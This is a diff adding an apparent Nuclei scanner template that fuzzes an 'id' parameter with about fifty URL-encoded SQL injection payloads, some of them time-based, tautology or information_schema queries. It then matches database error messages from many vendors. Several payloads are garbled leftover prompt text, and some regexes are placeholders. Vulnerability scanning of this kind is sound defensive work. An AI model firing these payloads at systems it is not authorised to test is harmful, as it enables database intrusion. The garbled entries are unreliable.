@@ -1,0 +1,550 @@
+
+id: sqli-error-based
+
+info:
+  name: Error based SQL Injection
+  author: geeknik,pdteam
+  severity: critical
+  description: |
+    Direct SQL Command Injection is a technique where an attacker creates or alters existing SQL commands to expose hidden data,
+    or to override valuable ones, or even to execute dangerous system level commands on the database host.
+    This is accomplished by the application taking user input and combining it with static parameters to build an SQL query .
+  metadata:
+    max-request: 3
+  tags: sqli,error,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+
+    payloads:
+      injection:
+        - "CREATE A NEW SQL INJECTION PAYLOAD."
+        - "create a new SQL Injection payload."
+        - "1%253B waitfor delay '0%253A0%253A5'--"
+        - "or sleep%25285%2529%2523"
+        - "AND %2528SELECT %252A FROM users WHERE id%253D0%2529%253DAND %2528SELECT %252A FROM users WHERE id%253D0%2529"
+        - "or 1%253D1%2523"
+        - "1%2529"
+        - "or 1%253D1--"
+        - "OR 1%253D1 AND 'a'%253D'a --"
+        - "--"
+        - "select %2540%2540version --"
+        - "ORDER BY 19--"
+        - "or 1%253D1 -- -"
+        - "1"
+        - "or 1%253D1 --"
+        - "declare %2540variable int%250D%250Aset %2540variable %253D 5%250D%250A%250Adeclare %2540string varchar%252810%2529%250D%250Aset %2540string %253D 'SELECT %252A FROM Table WHERE ID %253D 1%253B --' %252B char%252813%2529 %252B '--' %252B char%252839%2529 %252B 'a' %252B char%252839%2529 %252B '%257C%257C..."
+        - "create table new_table %2528data varbinary%25288000%2529%2529 insert into new_table values %25280x3A0023002E00720062006F00660063007200750073007300740029003A0030002C003900310030%2529 select top 1 data from new_table"
+        - "1%2529 OR pg_SLEEP%25285%2529--"
+        - "and %2528select substring%2528%2540%2540version%252C 1%252C 1%2529%2529 %253D 5 limit 1--"
+        - "or 1%253D0--"
+        - "or benchmark%252810000000%252CMD5%25281%2529%2529%2523"
+        - "or SLEEP%25285%2529%2523"
+        - "'1'%253D'1'"
+        - "create sql injection payload - 1%2529 or pg_SLEEP%25285%2529--"
+        - "or %2528select %2528if%2528%2528SELECT substring%2528column_name FROM offset 1 FOR 1%2529 FROM information_schema.columns WHERE table_name%253D'users' AND column_name LIKE '%2525'%2529 regexp '%255E%255Ba-z%255D%2524'%2529 %252C NULL%252C NULL%2529%2529 and '%2525' %253D '%2525' or '1' %253D '1"
+        - "or 1%253D1 --"
+        - "or 1%253D1%252F%252A"
+        - "or 1%253D1%253B --"
+        - "1%2529 or sleep%25285%2529--"
+        - "or 1%253D1%252F%252A"
+        - "or 1%253D1--"
+        - "1%2529 ORDER BY 18%2523"
+        - "' OR SLEEP%25285%2529%253D'"
+        - "1%2529%2529 or pg_sleep%25285%2529--"
+        - "or sleep%25285%2529%2523"
+        - "or 1%253D1%2523"
+        - "\" or \"x\"%253D\"x\" or \"x\"%253D\"x\"--"
+        - "or sleep%25285%2529%2523"
+        - "'%253Bwaitfor delay '0%253A0%253A5'--"
+        - "\""
+        - "or 1%253D1"
+        - "Create new SQL Injection payload%253A%250A%2529%2529%252520waitfor%252520delay%252520'0%253A0%253A20'%252520--"
+        - "1 or sleep%25285%2529 --"
+        - "1%2529%2529%25250Await%252520delay%2525200x0e0x01--"
+        - "Or 1%253D0--"
+        - "OR 1%253D0%2523"
+        - "1%2529 admin'%2529%252520waitfor%252520delay%252520'0%253A0%253A30'%252520--"
+        - "or 1%253D1 --"
+        - "'or'x"
+        - "\"%253Bwaitfor delay '0%253A0%253A5'--"
+
+
+    fuzzing:
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?id={{injection}}&Submit=Submit#"
+
+    stop-at-first-match: false
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "<pre>ID:\\s*.*?<br \\/>First name:\\s*[^<]+<br \\/>Surname:\\s*[^<]+<\\/pre>"
+          
+      - type: word
+        part: body
+        words:
+          - "Adminer"
+        negative: true
+        # False Positive
+
+      - type: regex
+        regex:
+          # MySQL
+          - "SQL syntax.*?MySQL"
+          - "Warning.*?\\Wmysqli?_"
+          - "MySQLSyntaxErrorException"
+          - "valid MySQL result"
+          - "check the manual that (corresponds to|fits) your MySQL server version"
+          - "Unknown column '[^ ]+' in 'field list'"
+          - "MySqlClient\\."
+          - "com\\.mysql\\.jdbc"
+          - "Zend_Db_(Adapter|Statement)_Mysqli_Exception"
+          - "Pdo[./_\\\\]Mysql"
+          - "MySqlException"
+          - "SQLSTATE\\[\\d+\\]: Syntax error or access violation"
+          # MariaDB
+          - "check the manual that (corresponds to|fits) your MariaDB server version"
+          # Drizzle
+          - "check the manual that (corresponds to|fits) your Drizzle server version"
+          # MemSQL
+          - "MemSQL does not support this type of query"
+          - "is not supported by MemSQL"
+          - "unsupported nested scalar subselect"
+          # PostgreSQL
+          - "PostgreSQL.*?ERROR"
+          - "Warning.*?\\Wpg_"
+          - "valid PostgreSQL result"
+          - "Npgsql\\."
+          - "PG::SyntaxError:"
+          - "org\\.postgresql\\.util\\.PSQLException"
+          - "ERROR:\\s\\ssyntax error at or near"
+          - "ERROR: parser: parse error at or near"
+          - "PostgreSQL query failed"
+          - "org\\.postgresql\\.jdbc"
+          - "Pdo[./_\\\\]Pgsql"
+          - "PSQLException"
+          # Microsoft SQL Server
+          - "Driver.*? SQL[\\-\\_\\ ]*Server"
+          - "OLE DB.*? SQL Server"
+          - "\\bSQL Server[^&lt;&quot;]+Driver"
+          - "Warning.*?\\W(mssql|sqlsrv)_"
+          - "\\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}"
+          - "System\\.Data\\.SqlClient\\.SqlException\\.(SqlException|SqlConnection\\.OnError)"
+          - "(?s)Exception.*?\\bRoadhouse\\.Cms\\."
+          - "Microsoft SQL Native Client error '[0-9a-fA-F]{8}"
+          - "\\[SQL Server\\]"
+          - "ODBC SQL Server Driver"
+          - "ODBC Driver \\d+ for SQL Server"
+          - "SQLServer JDBC Driver"
+          - "com\\.jnetdirect\\.jsql"
+          - "macromedia\\.jdbc\\.sqlserver"
+          - "Zend_Db_(Adapter|Statement)_Sqlsrv_Exception"
+          - "com\\.microsoft\\.sqlserver\\.jdbc"
+          - "Pdo[./_\\\\](Mssql|SqlSrv)"
+          - "SQL(Srv|Server)Exception"
+          - "Unclosed quotation mark after the character string"
+          # Microsoft Access
+          - "Microsoft Access (\\d+ )?Driver"
+          - "JET Database Engine"
+          - "Access Database Engine"
+          - "ODBC Microsoft Access"
+          - "Syntax error \\(missing operator\\) in query expression"
+          # Oracle
+          - "\\bORA-\\d{5}"
+          - "Oracle error"
+          - "Oracle.*?Driver"
+          - "Warning.*?\\W(oci|ora)_"
+          - "quoted string not properly terminated"
+          - "SQL command not properly ended"
+          - "macromedia\\.jdbc\\.oracle"
+          - "oracle\\.jdbc"
+          - "Zend_Db_(Adapter|Statement)_Oracle_Exception"
+          - "Pdo[./_\\\\](Oracle|OCI)"
+          - "OracleException"
+          # IBM DB2
+          - "CLI Driver.*?DB2"
+          - "DB2 SQL error"
+          - "\\bdb2_\\w+\\("
+          - "SQLCODE[=:\\d, -]+SQLSTATE"
+          - "com\\.ibm\\.db2\\.jcc"
+          - "Zend_Db_(Adapter|Statement)_Db2_Exception"
+          - "Pdo[./_\\\\]Ibm"
+          - "DB2Exception"
+          - "ibm_db_dbi\\.ProgrammingError"
+          # Informix
+          - "Warning.*?\\Wifx_"
+          - "Exception.*?Informix"
+          - "Informix ODBC Driver"
+          - "ODBC Informix driver"
+          - "com\\.informix\\.jdbc"
+          - "weblogic\\.jdbc\\.informix"
+          - "Pdo[./_\\\\]Informix"
+          - "IfxException"
+          # Firebird
+          - "Dynamic SQL Error"
+          - "Warning.*?\\Wibase_"
+          - "org\\.firebirdsql\\.jdbc"
+          - "Pdo[./_\\\\]Firebird"
+          # SQLite
+          - "SQLite/JDBCDriver"
+          - "SQLite\\.Exception"
+          - "(Microsoft|System)\\.Data\\.SQLite\\.SQLiteException"
+          - "Warning.*?\\W(sqlite_|SQLite3::)"
+          - "SQLITE_ERROR"
+          - "SQLite error \\d+:"
+          - "sqlite3.OperationalError:"
+          - "SQLite3::SQLException"
+          - "org\\.sqlite\\.JDBC"
+          - "Pdo[./_\\\\]Sqlite"
+          - "SQLiteException"
+          # SAP MaxDB
+          - "SQL error.*?POS([0-9]+)"
+          - "Warning.*?\\Wmaxdb_"
+          - "DriverSapDB"
+          - "-3014.*?Invalid end of SQL statement"
+          - "com\\.sap\\.dbtech\\.jdbc"
+          - "\\[-3008\\].*?: Invalid keyword or missing delimiter"
+          # Sybase
+          - "Warning.*?\\Wsybase_"
+          - "Sybase message"
+          - "Sybase.*?Server message"
+          - "SybSQLException"
+          - "Sybase\\.Data\\.AseClient"
+          - "com\\.sybase\\.jdbc"
+          # Ingres
+          - "Warning.*?\\Wingres_"
+          - "Ingres SQLSTATE"
+          - "Ingres\\W.*?Driver"
+          - "com\\.ingres\\.gcf\\.jdbc"
+          # FrontBase
+          - "Exception (condition )?\\d+\\. Transaction rollback"
+          - "com\\.frontbase\\.jdbc"
+          - "Syntax error 1. Missing"
+          - "(Semantic|Syntax) error [1-4]\\d{2}\\."
+          # HSQLDB
+          - "Unexpected end of command in statement \\["
+          - "Unexpected token.*?in statement \\["
+          - "org\\.hsqldb\\.jdbc"
+          # H2
+          - "org\\.h2\\.jdbc"
+          - "\\[42000-192\\]"
+          # MonetDB
+          - "![0-9]{5}![^\\n]+(failed|unexpected|error|syntax|expected|violation|exception)"
+          - "\\[MonetDB\\]\\[ODBC Driver"
+          - "nl\\.cwi\\.monetdb\\.jdbc"
+          # Apache Derby
+          - "Syntax error: Encountered"
+          - "org\\.apache\\.derby"
+          - "ERROR 42X01"
+          # Vertica
+          - ", Sqlstate: (3F|42).{3}, (Routine|Hint|Position):"
+          - "/vertica/Parser/scan"
+          - "com\\.vertica\\.jdbc"
+          - "org\\.jkiss\\.dbeaver\\.ext\\.vertica"
+          - "com\\.vertica\\.dsi\\.dataengine"
+          # Mckoi
+          - "com\\.mckoi\\.JDBCDriver"
+          - "com\\.mckoi\\.database\\.jdbc"
+          - "&lt;REGEX_LITERAL&gt;"
+          # Presto
+          - "com\\.facebook\\.presto\\.jdbc"
+          - "io\\.prestosql\\.jdbc"
+          - "com\\.simba\\.presto\\.jdbc"
+          - "UNION query has different number of fields: \\d+, \\d+"
+          # Altibase
+          - "Altibase\\.jdbc\\.driver"
+          # MimerSQL
+          - "com\\.mimer\\.jdbc"
+          - "Syntax error,[^\\n]+assumed to mean"
+          # CrateDB
+          - "io\\.crate\\.client\\.jdbc"
+          # Cache
+          - "encountered after end of query"
+          - "A comparison operator is required here"
+          # Raima Database Manager
+          - "-10048: Syntax error"
+          - "rdmStmtPrepare\\(.+?\\) returned"
+          # Virtuoso
+          - "SQ074: Line \\d+:"
+          - "SR185: Undefined procedure"
+          - "SQ200: No table "
+          - "Virtuoso S0002 Error"
+          - "\\[(Virtuoso Driver|Virtuoso iODBC Driver)\\]\\[Virtuoso Server\\]"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: mysql
+        regex:
+          - "SQL syntax.*?MySQL"
+          - "Warning.*?\\Wmysqli?_"
+          - "MySQLSyntaxErrorException"
+          - "valid MySQL result"
+          - "check the manual that (corresponds to|fits) your MySQL server version"
+          - "Unknown column '[^ ]+' in 'field list'"
+          - "MySqlClient\\."
+          - "com\\.mysql\\.jdbc"
+          - "Zend_Db_(Adapter|Statement)_Mysqli_Exception"
+          - "Pdo[./_\\\\]Mysql"
+          - "MySqlException"
+          - "SQLSTATE[\\d+]: Syntax error or access violation"
+
+      - type: regex
+        name: mariadb
+        regex:
+          - "check the manual that (corresponds to|fits) your MariaDB server version"
+
+      - type: regex
+        name: drizzel
+        regex:
+          - "check the manual that (corresponds to|fits) your Drizzle server version"
+
+      - type: regex
+        name: memsql
+        regex:
+          - "MemSQL does not support this type of query"
+          - "is not supported by MemSQL"
+          - "unsupported nested scalar subselect"
+
+      - type: regex
+        name: postgresql
+        regex:
+          - "PostgreSQL.*?ERROR"
+          - "Warning.*?\\Wpg_"
+          - "valid PostgreSQL result"
+          - "Npgsql\\."
+          - "PG::SyntaxError:"
+          - "org\\.postgresql\\.util\\.PSQLException"
+          - "ERROR:\\s\\ssyntax error at or near"
+          - "ERROR: parser: parse error at or near"
+          - "PostgreSQL query failed"
+          - "org\\.postgresql\\.jdbc"
+          - "Pdo[./_\\\\]Pgsql"
+          - "PSQLException"
+
+      - type: regex
+        name: microsoftsqlserver
+        regex:
+          - "Driver.*? SQL[\\-\\_\\ ]*Server"
+          - "OLE DB.*? SQL Server"
+          - "\\bSQL Server[^&lt;&quot;]+Driver"
+          - "Warning.*?\\W(mssql|sqlsrv)_"
+          - "\\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}"
+          - "System\\.Data\\.SqlClient\\.SqlException\\.(SqlException|SqlConnection\\.OnError)"
+          - "(?s)Exception.*?\\bRoadhouse\\.Cms\\."
+          - "Microsoft SQL Native Client error '[0-9a-fA-F]{8}"
+          - "\\[SQL Server\\]"
+          - "ODBC SQL Server Driver"
+          - "ODBC Driver \\d+ for SQL Server"
+          - "SQLServer JDBC Driver"
+          - "com\\.jnetdirect\\.jsql"
+          - "macromedia\\.jdbc\\.sqlserver"
+          - "Zend_Db_(Adapter|Statement)_Sqlsrv_Exception"
+          - "com\\.microsoft\\.sqlserver\\.jdbc"
+          - "Pdo[./_\\\\](Mssql|SqlSrv)"
+          - "SQL(Srv|Server)Exception"
+          - "Unclosed quotation mark after the character string"
+
+      - type: regex
+        name: microsoftaccess
+        regex:
+          - "Microsoft Access (\\d+ )?Driver"
+          - "JET Database Engine"
+          - "Access Database Engine"
+          - "ODBC Microsoft Access"
+          - "Syntax error \\(missing operator\\) in query expression"
+
+      - type: regex
+        name: oracle
+        regex:
+          - "\\bORA-\\d{5}"
+          - "Oracle error"
+          - "Oracle.*?Driver"
+          - "Warning.*?\\W(oci|ora)_"
+          - "quoted string not properly terminated"
+          - "SQL command not properly ended"
+          - "macromedia\\.jdbc\\.oracle"
+          - "oracle\\.jdbc"
+          - "Zend_Db_(Adapter|Statement)_Oracle_Exception"
+          - "Pdo[./_\\\\](Oracle|OCI)"
+          - "OracleException"
+
+      - type: regex
+        name: ibmdb2
+        regex:
+          - "CLI Driver.*?DB2"
+          - "DB2 SQL error"
+          - "\\bdb2_\\w+\\("
+          - "SQLCODE[=:\\d, -]+SQLSTATE"
+          - "com\\.ibm\\.db2\\.jcc"
+          - "Zend_Db_(Adapter|Statement)_Db2_Exception"
+          - "Pdo[./_\\\\]Ibm"
+          - "DB2Exception"
+          - "ibm_db_dbi\\.ProgrammingError"
+
+      - type: regex
+        name: informix
+        regex:
+          - "Warning.*?\\Wifx_"
+          - "Exception.*?Informix"
+          - "Informix ODBC Driver"
+          - "ODBC Informix driver"
+          - "com\\.informix\\.jdbc"
+          - "weblogic\\.jdbc\\.informix"
+          - "Pdo[./_\\\\]Informix"
+          - "IfxException"
+
+      - type: regex
+        name: firebird
+        regex:
+          - "Dynamic SQL Error"
+          - "Warning.*?\\Wibase_"
+          - "org\\.firebirdsql\\.jdbc"
+          - "Pdo[./_\\\\]Firebird"
+
+      - type: regex
+        name: sqlite
+        regex:
+          - "SQLite/JDBCDriver"
+          - "SQLite\\.Exception"
+          - "(Microsoft|System)\\.Data\\.SQLite\\.SQLiteException"
+          - "Warning.*?\\W(sqlite_|SQLite3::)"
+          - "SQLITE_ERROR"
+          - "SQLite error \\d+:"
+          - "sqlite3.OperationalError:"
+          - "SQLite3::SQLException"
+          - "org\\.sqlite\\.JDBC"
+          - "Pdo[./_\\\\]Sqlite"
+          - "SQLiteException"
+
+      - type: regex
+        name: sapmaxdb
+        regex:
+          - "SQL error.*?POS([0-9]+)"
+          - "Warning.*?\\Wmaxdb_"
+          - "DriverSapDB"
+          - "-3014.*?Invalid end of SQL statement"
+          - "com\\.sap\\.dbtech\\.jdbc"
+          - "\\[-3008\\].*?: Invalid keyword or missing delimiter"
+
+      - type: regex
+        name: sybase
+        regex:
+          - "Warning.*?\\Wsybase_"
+          - "Sybase message"
+          - "Sybase.*?Server message"
+          - "SybSQLException"
+          - "Sybase\\.Data\\.AseClient"
+          - "com\\.sybase\\.jdbc"
+
+      - type: regex
+        name: ingres
+        regex:
+          - "Warning.*?\\Wingres_"
+          - "Ingres SQLSTATE"
+          - "Ingres\\W.*?Driver"
+          - "com\\.ingres\\.gcf\\.jdbc"
+
+      - type: regex
+        name: frontbase
+        regex:
+          - "Exception (condition )?\\d+\\. Transaction rollback"
+          - "com\\.frontbase\\.jdbc"
+          - "Syntax error 1. Missing"
+          - "(Semantic|Syntax) error \\[1-4\\]\\d{2}\\."
+
+      - type: regex
+        name: hsqldb
+        regex:
+          - "Unexpected end of command in statement \\["
+          - "Unexpected token.*?in statement \\["
+          - "org\\.hsqldb\\.jdbc"
+
+      - type: regex
+        name: h2
+        regex:
+          - "org\\.h2\\.jdbc"
+          - "\\[42000-192\\]"
+
+      - type: regex
+        name: monetdb
+        regex:
+          - "![0-9]{5}![^\\n]+(failed|unexpected|error|syntax|expected|violation|exception)"
+          - "\\[MonetDB\\]\\[ODBC Driver"
+          - "nl\\.cwi\\.monetdb\\.jdbc"
+
+      - type: regex
+        name: apachederby
+        regex:
+          - "Syntax error: Encountered"
+          - "org\\.apache\\.derby"
+          - "ERROR 42X01"
+
+      - type: regex
+        name: vertica
+        regex:
+          - ", Sqlstate: (3F|42).{3}, (Routine|Hint|Position):"
+          - "/vertica/Parser/scan"
+          - "com\\.vertica\\.jdbc"
+          - "org\\.jkiss\\.dbeaver\\.ext\\.vertica"
+          - "com\\.vertica\\.dsi\\.dataengine"
+
+      - type: regex
+        name: mckoi
+        regex:
+          - "com\\.mckoi\\.JDBCDriver"
+          - "com\\.mckoi\\.database\\.jdbc"
+          - "&lt;REGEX_LITERAL&gt;"
+
+      - type: regex
+        name: presto
+        regex:
+          - "com\\.facebook\\.presto\\.jdbc"
+          - "io\\.prestosql\\.jdbc"
+          - "com\\.simba\\.presto\\.jdbc"
+          - "UNION query has different number of fields: \\d+, \\d+"
+
+      - type: regex
+        name: altibase
+        regex:
+          - "Altibase\\.jdbc\\.driver"
+
+      - type: regex
+        name: mimersql
+        regex:
+          - "com\\.mimer\\.jdbc"
+          - "Syntax error,[^\\n]+assumed to mean"
+
+      - type: regex
+        name: cratedb
+        regex:
+          - "io\\.crate\\.client\\.jdbc"
+
+      - type: regex
+        name: cache
+        regex:
+          - "encountered after end of query"
+          - "A comparison operator is required here"
+
+      - type: regex
+        name: raimadatabasemanager
+        regex:
+          - "-10048: Syntax error"
+          - "rdmStmtPrepare\\(.+?\\) returned"
+
+      - type: regex
+        name: virtuoso
+        regex:
+          - "SQ074: Line \\d+:"
+          - "SR185: Undefined procedure"
+          - "SQ200: No table "
+          - "Virtuoso S0002 Error"
+          - "\\[(Virtuoso Driver|Virtuoso iODBC Driver)\\]\\[Virtuoso Server\\]"
